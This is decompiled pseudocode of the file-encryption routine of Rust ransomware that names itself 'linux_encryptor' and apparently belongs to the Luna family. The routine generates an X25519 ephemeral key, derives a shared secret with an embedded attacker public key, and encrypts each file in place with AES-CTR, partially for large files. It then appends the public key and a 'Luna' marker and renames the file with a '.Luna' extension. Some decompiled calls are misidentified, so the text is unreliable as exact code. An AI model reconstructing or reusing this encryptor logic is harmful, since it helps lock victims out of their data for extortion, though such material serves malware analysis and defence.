int linux_encryptor::files::add_file::h9f8ecb31ebca83c0()
{
    unsigned int v0;  // [sp-0x124c]
    struct struct_0 **v1;  // [sp-0x1248], Other Possible Types: unsigned long
    struct struct_0 **v2;  // [sp-0x1240], Other Possible Types: unsigned long long
    struct struct_0 **v3;  // [bp-0x1228], Other Possible Types: unsigned long long
    struct struct_0 **v4;  // [sp-0x1220]
    struct_3 *v6;  // [sp-0x1200]
    unsigned long long v7;  // [sp-0x11f8]
    unsigned long long v8[3];  // [sp-0x11f0]
    struct struct_0 **v9;  // [sp-0x11e8]
    unsigned long long v10;  // [sp-0x11e0]
    struct struct_0 **v11;  // [sp-0x11d8]
    struct struct_0 **v12;  // [sp-0x11c8]
    struct struct_0 **v13;  // [bp-0x11b8]
    struct struct_0 **v14;  // [sp-0x11a8]
    struct struct_0 **v15;  // [bp-0x1188], Other Possible Types: char
    char v16;  // [bp-0x1184]
    char v17;  // [bp-0x1180]
    struct struct_0 **v18;  // [sp-0x1178]
    struct struct_0 **v19;  // [bp-0x1168], Other Possible Types: unsigned long
    struct struct_0 **v20;  // [sp-0x1160], Other Possible Types: unsigned long long
    struct struct_0 **v21;  // [sp-0x1160]
    struct struct_0 **v22;  // [bp-0x1158], Other Possible Types: char
    struct struct_0 **v23;  // [sp-0x1148]
    struct struct_0 **v24;  // [sp-0x1138]
    unsigned long long v25;  // [sp-0x10b0]
    struct struct_0 **v26;  // [sp-0x10a8]
    struct struct_0 **v27;  // [sp-0x1098]
    char v28;  // [bp-0x1088], Other Possible Types: unsigned long long
    struct_3 *v29;  // [sp-0x1080]
    struct struct_0 **v30;  // [bp-0x1068], Other Possible Types: unsigned long
    struct struct_0 **v31;  // [bp-0x1060], Other Possible Types: char, unsigned long, unsigned long long
    struct struct_0 **v32;  // [bp-0x1058], Other Possible Types: void*
    struct struct_0 **v33;  // [sp-0x1048], Other Possible Types: struct struct_1 **
    unsigned long long v34;  // [sp-0x1040]
    char v35;  // [bp-0x1038]
    unsigned short v36;  // [bp-0x38]
    unsigned long long v38[3];  // rdi
    struct struct_0 **v39;  // rbx
    struct struct_0 **v40;  // xmm0
    struct struct_0 **v41;  // xmm0
    struct struct_0 **v42;  // xmm0
    struct struct_0 **v43;  // xmm0
    struct struct_0 **v44;  // xmm0
    struct struct_0 **v45;  // xmm0
    struct struct_0 **v46;  // xmm0
    int v47;  // ymm0
    int v48;  // ymm0
    unsigned long long v49;  // r13
    struct_3 *v50;  // rdx
    unsigned long long v51;  // rax
    unsigned long long v52;  // rsi
    unsigned long v53;  // cc_ndep
    unsigned long v54;  // rsi
    unsigned long long v55;  // rcx
    unsigned long long v56;  // rcx
    struct struct_0 **v57;  // rax
    unsigned long long v58;  // rax
    struct struct_0 **v59;  // rax
    struct struct_0 **v60;  // rbp
    struct struct_0 **v61;  // r15
    struct struct_0 **v62;  // r14
    struct struct_0 **v63;  // rbx
    struct struct_0 **v64;  // r15
    struct struct_0 **v65;  // r14
    struct struct_0 **v66;  // rax
    struct struct_0 **v67;  // rax
    struct struct_0 **v68;  // rbp
    struct struct_0 **v69;  // rax
    struct struct_0 **v70;  // r13
    unsigned long long v71;  // rsi
    struct struct_0 **v72;  // rax
    unsigned long long v73;  // rsi
    struct struct_0 **v74;  // rbx
    struct_3 *v75;  // r12
    unsigned long long v76;  // rsi
    unsigned long long v77;  // rsi
    unsigned long long v78;  // rsi
    unsigned long long v79;  // rsi
    struct struct_0 **v80;  // rsi
    unsigned long long v81;  // r15
    struct struct_0 **v82;  // rbx
    struct struct_0 **v83;  // rbx
    struct struct_0 **v84;  // r14
    unsigned long long v86;  // rdx

    v8[0] = v38;
    std::fs::File::options::h701451fe939867ff(&v13);
    std::fs::OpenOptions::_open::h5872a79563820f96(&v15, std::fs::OpenOptions::write::h5c55bee0255dc0e5(std::fs::OpenOptions::read::hee1577cec7916d5b(&v13, 1), 1), v38[0], v38[2]);
    if (*((int *)&v15))
    {
        v3 = *((long long *)&v17);
        goto *((int *)(4534320 + (vvar_1120{stack -4648} & 3) * 4)) + 4534320;
    }
    else
    {
        v0 = *((int *)&v16);
        std::fs::File::metadata::hcd1b310905489c6d(&v30, &v0);
        if (v30)
        {
            v19 = v31;
            core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v19, &g_473e70, &g_473f20); /* do not return */
        }
        memcpy(&v19, &v31, 176);
        v39 = std::fs::Metadata::len::h4d1f7e201d61428c(&v19);
        *((uint128_t *)&v14) = 0;
        *((uint128_t *)&v13) = 0;
        _$LT$rand_core..os..OsRng$u20$as$u20$rand_core..RngCore$GT$::fill_bytes::h05d0c8f222479ec2(&v15, &v13, 32);
        v40 = *((int128_t *)&v13);
        v32 = v14;
        v30 = v40;
        x25519_dalek::x25519::clamp_scalar::hc83d8d312a5ba984(&v19, &v30);
        v41 = *((int128_t *)&v19);
        v26 = v41;
        *((int128_t *)&v27) = *((int128_t *)&v22);
        _$LT$x25519_dalek..x25519..PublicKey$u20$as$u20$core..convert..From$LT$$RF$x25519_dalek..x25519..EphemeralSecret$GT$$GT$::from::he281c90061a388da(&v28, &v26);
        *((uint128_t *)&v12) = 0;
        *((uint128_t *)&v11) = 0;
        memset(&v35, 0, 0x1000);
        v30 = &"G7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n";
        v31 = 44;
        v36 = 0;
        *((uint128_t *)&v32) = 0;
        *((uint128_t *)&v33) = 0;
        _$LT$base64_stream..from_base64_reader..FromBase64Reader$LT$R$C$N$GT$$u20$as$u20$std..io..Read$GT$::read::hb3c702596d042c13(&v19, &v30, &v11);
        if (v19)
        {
            v13 = v20;
            core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v13, &g_473e70, &g_473ee8); /* do not return */
        }
        v42 = v11;
        v22 = v12;
        v19 = v42;
        _$LT$x25519_dalek..x25519..PublicKey$u20$as$u20$core..convert..From$LT$$u5b$u8$u3b$$u20$32$u5d$$GT$$GT$::from::h7cab22afea86b4bc(&v1, &v19);
        x25519_dalek::x25519::StaticSecret::diffie_hellman::h67523ff67070ee4a(&v3, &v26, &v1);
        curve25519_dalek::montgomery::MontgomeryPoint::to_bytes::h16a036e8efe08c9e(&v15, &v3);
        curve25519_dalek::montgomery::MontgomeryPoint::to_bytes::h16a036e8efe08c9e(&v13, &v28);
        v43 = v15;
        v22 = v18;
        v19 = v43;
        v44 = *((int128_t *)&v13);
        v23 = v44;
        v24 = v14;
        x25519_dalek::x25519::_DERIVE_zeroize_Zeroize_FOR_SharedSecret::_$LT$impl$u20$zeroize..Zeroize$u20$for$u20$x25519_dalek..x25519..SharedSecret$GT$::zeroize::h6df515ff054eb0e3(&v3);
        x25519_dalek::x25519::_DERIVE_Drop_FOR_EphemeralSecret::_$LT$impl$u20$core..ops..drop..Drop$u20$for$u20$x25519_dalek..x25519..EphemeralSecret$GT$::drop::h5ad457619b311fec(&v26);
        v45 = *((int128_t *)&v19);
        *((int128_t *)&v18) = *((int128_t *)&v22);
        v15 = v45;
        v46 = v23;
        v48 = ...;
        v14 = v24;
        v13 = v46;
        v49 = crypto::aes::ctr::h515350042bdb7574();
        v28 = v49;
        v29 = v50;
        v51 = v39 / 0x50000 * 30;
        v9 = v39;
        if (v51 >= 60100)
        {
            v6 = v50;
            v7 = v49;
            v10 = (v39 + 0x1770000) / 599;
            v52 = 599;
            goto LABEL_40a338;
        }
        if (v51 >= 100 && !((char)amd64g_calculate_condition(2, 6, v51 - 100 & 4294967295 & 65535, 100, v53)))
        {
            v6 = v50;
            v7 = v49;
            v54 = ((unsigned int)v51 >> 2) * 5243 >> 17;
            v55 = v54;
            v56 = v55 - 1;
            if (v55 == 1)
                core::panicking::panic::h8705e81f284be8a5("attempt to divide by zeroError while writing encrypted data to: Error while writing public key to: Error while writing extension to: Error while renaming file: ", 25, &g_473f38); /* do not return */
            if (!((char)amd64g_calculate_condition(2, 6, v51 & 65535, 100, v53)))
            {
                v58 = &v9[-0xa000 * v54];
                if (!(v58 | v56) >> 32)
                {
                    v10 = ((unsigned int)((0 CONCAT (unsigned int)v58) % (v56 & 4294967295)) CONCAT (unsigned int)((0 CONCAT (unsigned int)v58) / (v56 & 4294967295))) & 4294967295;
                    v52 = v54 - 1;
                    if (!(!v54 - 1))
                        goto LABEL_40a338;
                }
                else
                {
                    v10 = (unsigned long long)((0 CONCAT v58) % v56) CONCAT (unsigned long long)((0 CONCAT v58) / v56);
                    v52 = v54 - 1;
                    if (v54 != 1)
                    {
LABEL_40a338:
                        v10 += 0x50000;
                        v65 = 0;
                        do
                        {
                            v25 = v52;
                            v67 = __rust_alloc(0x50000, 1);
                            if (!v67)
                                alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
                            v68 = v67;
                            v3 = v67;
                            memset(v67, 0, 0x50000);
                            *((uint128_t *)&v4) = 0x500000000000000050000;
                            v69 = __rust_alloc(0x50000, 1);
                            if (!v69)
                                alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
                            v70 = v69;
                            v19 = v69;
                            memset(v69, 0, 0x50000);
                            v48 = (v48 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | 0x500000000000000050000) & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | 0x500000000000000050000;
                            *((uint128_t *)&v20) = 0x500000000000000050000;
                            v31 = v65;
                            v30 = 0;
                            _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v1, &v0, &v30);
                            if (v1)
                            {
                                v30 = v2;
                                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_473f50); /* do not return */
                            }
                            _$LT$std..process..ChildStdout$u20$as$u20$std..io..Read$GT$::read::h145aaf2317f1234e(&v30, &v0, v68, 0x50000);
                            if (v30)
                            {
                                v1 = v31;
                                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't read file.", 16, &v1, &g_473e70, &g_473f68); /* do not return */
                            }
                            v6->field_18(v7, v68, 0x50000, v70, 0x50000);
                            v31 = v65;
                            v30 = 0;
                            _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v1, &v0, &v30);
                            if (v1)
                            {
                                v30 = v2;
                                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_473f80); /* do not return */
                            }
                            std::os::unix::net::datagram::UnixDatagram::send::h0ffe94fa98154168(&v11, &v0, v70, 0x50000);
                            if (v11)
                            {
                                v1 = &v8[0];
                                v2 = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h7364595569e6a5ab;
                                v30 = &g_473f98;
                                v31 = 2;
                                v32 = 0;
                                v33 = &v1;
                                v34 = 1;
                                std::io::stdio::_print::h7035045a22bdb588(&v30, v73, v50);
                                core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v11);
                                __rust_dealloc(v70);
                                __rust_dealloc(v68);
                                v49 = v7;
                                v75 = v6;
                                goto LABEL_40aefd;
                            }
                            __rust_dealloc(v70);
                            __rust_dealloc(v68);
                            v65 = (char *)v65 + v10;
                            v71 = v25;
                            v52 = v71 - 1;
                        } while (v71 != 1);
                    }
                }
            }
        }
        else if (v39 <= 327679)
        {
            if (!v39)
            {
                v60 = v39;
                v3 = 1;
                *((uint128_t *)&v4) = 0;
                v19 = 1;
                *((uint128_t *)&v20) = 0;
                v61 = 1;
                v62 = 1;
                v63 = 1;
            }
            else
            {
                v59 = __rust_alloc(v39, 1);
                if (!v59)
                    alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
                v61 = v59;
                v3 = v59;
                v4 = v39;
                memset(v59, 0, v39);
                v4 = v39;
                v72 = __rust_alloc(v39, 1);
                if (!v72)
                    alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
                v62 = v72;
                v19 = v72;
                v21 = v39;
                memset(v72, 0, v39);
                v60 = v39;
                v22 = v39;
                v63 = v62;
            }
            *((uint128_t *)&v30) = 0;
            _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v1, &v0, &v30);
            if (v1)
            {
                v30 = v2;
                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_473fb8); /* do not return */
            }
            _$LT$std..process..ChildStdout$u20$as$u20$std..io..Read$GT$::read::h145aaf2317f1234e(&v30, &v0, v61, v60);
            if (v30)
            {
                v1 = v31;
                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't read file.", 16, &v1, &g_473e70, &g_473fd0); /* do not return */
            }
            v50->field_18(v49, v61, v60, v63, v60);
            *((uint128_t *)&v30) = 0;
            _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v1, &v0, &v30);
            if (v1)
            {
                v30 = v2;
                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_473fe8); /* do not return */
            }
            std::os::unix::net::datagram::UnixDatagram::send::h0ffe94fa98154168(&v11, &v0, v63, v9);
            if (v11)
            {
                v1 = &v8[0];
                v2 = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h7364595569e6a5ab;
                v30 = &g_473f98;
                v31 = 2;
                v32 = 0;
                v33 = &v1;
                v34 = 1;
                std::io::stdio::_print::h7035045a22bdb588(&v30, v77, v50);
                core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v11);
                if (v9)
                {
                    __rust_dealloc(v62);
                    __rust_dealloc(v61);
                    goto LABEL_40aefd;
                }
            }
            else
            {
                v6 = v50;
                v7 = v49;
                if (v9)
                {
                    __rust_dealloc(v62);
                    __rust_dealloc(v61);
                }
            }
        }
        else
        {
            v57 = __rust_alloc(0x50000, 1);
            if (!v57)
                alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
            v64 = v57;
            v3 = v57;
            memset(v57, 0, 0x50000);
            *((uint128_t *)&v4) = 0x500000000000000050000;
            v66 = __rust_alloc(0x50000, 1);
            if (!v66)
                alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
            v74 = v66;
            v19 = v66;
            memset(v66, 0, 0x50000);
            *((uint128_t *)&v20) = 0x500000000000000050000;
            *((uint128_t *)&v30) = 0;
            _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v1, &v0, &v30);
            if (v1)
            {
                v30 = v2;
                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_474000); /* do not return */
            }
            _$LT$std..process..ChildStdout$u20$as$u20$std..io..Read$GT$::read::h145aaf2317f1234e(&v30, &v0, v64, 0x50000);
            if (v30)
            {
                v1 = v31;
                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't read file.", 16, &v1, &g_473e70, &g_474018); /* do not return */
            }
            v50->field_18(v49, v64, 0x50000, v74, 0x50000);
            *((uint128_t *)&v30) = 0;
            _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v1, &v0, &v30);
            if (v1)
            {
                v30 = v2;
                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_474030); /* do not return */
            }
            std::os::unix::net::datagram::UnixDatagram::send::h0ffe94fa98154168(&v11, &v0, v74, 0x50000);
            if (!v11)
            {
                v6 = v50;
                v7 = v49;
                __rust_dealloc(v74);
                __rust_dealloc(v64);
                goto LABEL_40ab71;
            }
            else
            {
                v1 = &v8[0];
                v2 = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h7364595569e6a5ab;
                v30 = &g_473f98;
                v31 = 2;
                v32 = 0;
                v33 = &v1;
                v34 = 1;
                std::io::stdio::_print::h7035045a22bdb588(&v30, v76, v50);
                core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v11);
                __rust_dealloc(v74);
                __rust_dealloc(v64);
            }
LABEL_40aefd:
            v75->field_0(v49);
            goto LABEL_40af04;
        }
LABEL_40ab71:
        v31 = v9;
        v30 = 0;
        _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v19, &v0, &v30);
        v49 = v7;
        v75 = v6;
        if (v19)
        {
            v30 = v21;
            core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_474048); /* do not return */
        }
        std::os::unix::net::datagram::UnixDatagram::send::h0ffe94fa98154168(&v3, &v0, &v13, 32);
        if (v3)
        {
            v19 = &v8[0];
            v20 = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h7364595569e6a5ab;
            v30 = &g_474060;
            v31 = 2;
            v32 = 0;
            v33 = &v19;
            v34 = 1;
            std::io::stdio::_print::h7035045a22bdb588(&v30, v78, v50);
            core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v4);
            goto LABEL_40aefd;
        }
        else
        {
            v31 += 4;
            v30 = 0;
            _$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$::seek::h61858ed814c9e35b(&v19, &v0, &v30);
            if (v19)
            {
                v30 = v21;
                core::result::unwrap_failed::hddd78f4658ac7d0f("Can't seek file.Can't read file.", 16, &v30, &g_473e70, &g_474080); /* do not return */
            }
            std::os::unix::net::datagram::UnixDatagram::send::h0ffe94fa98154168(&v3, &v0, "Luna.ini.exe.dll.lnk", 4);
            if (v3)
            {
                v19 = &v8[0];
                v20 = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h7364595569e6a5ab;
                v30 = &g_474098;
                v31 = 2;
                v32 = 0;
                v33 = &v19;
                v34 = 1;
                std::io::stdio::_print::h7035045a22bdb588(&v30, v79, v50);
                core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v4);
                goto LABEL_40aefd;
            }
            else
            {
                _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::h3549ccdcce7dad99(&v30, v38);
                v80 = v32;
                if (v31 == v80)
                {
                    alloc::raw_vec::RawVec$LT$T$C$A$GT$::reserve::do_reserve_and_handle::h0efe5460ba49e6e2(&v30, v80, 1);
                    v80 = v32;
                }
                *((char *)(v30 + v80)) = 46;
                v22 = (char *)v80 + 1;
                *((int128_t *)&v19) = *((int128_t *)&v30);
                core::str::converts::from_utf8::hbf99f44e098525d0(&v30, "Luna.ini.exe.dll.lnk", 4);
                if (v30)
                {
                    *((int128_t *)&v3) = *((int128_t *)&v31);
                    core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v3, &g_473eb0, &g_4740b8); /* do not return */
                }
                v81 = v32;
                v82 = v22;
                if (v21 - v82 < v81)
                {
                    alloc::raw_vec::RawVec$LT$T$C$A$GT$::reserve::do_reserve_and_handle::h0efe5460ba49e6e2(&v19, v82, v81);
                    v82 = v22;
                }
                memcpy(v19 + v82, v31, v81);
                v83 = (char *)v82 + v81;
                v32 = v83;
                *((int128_t *)&v30) = *((int128_t *)&v19);
                v84 = v30;
                if (v31)
                    __rust_dealloc(v84);
                v1 = std::sys::unix::fs::rename::h3cb93b996c5e7b3f(v38[0], v38[2], v84, v83);
                if (v1)
                {
                    v19 = &v8[0];
                    v20 = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h7364595569e6a5ab;
                    v30 = &g_4740d0;
                    v31 = 2;
                    v32 = 0;
                    v33 = &v19;
                    v34 = 1;
                    std::io::stdio::_print::h7035045a22bdb588(&v30, v31, v86);
                    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v1);
                }
                else
                {
                    v75->field_0(v49);
LABEL_40af04:
                    if (!v75->field_8)
                    {
                        close(v0);
                        return;
                    }
                    __rust_dealloc(v49);
                }
            }
        }
    }
}
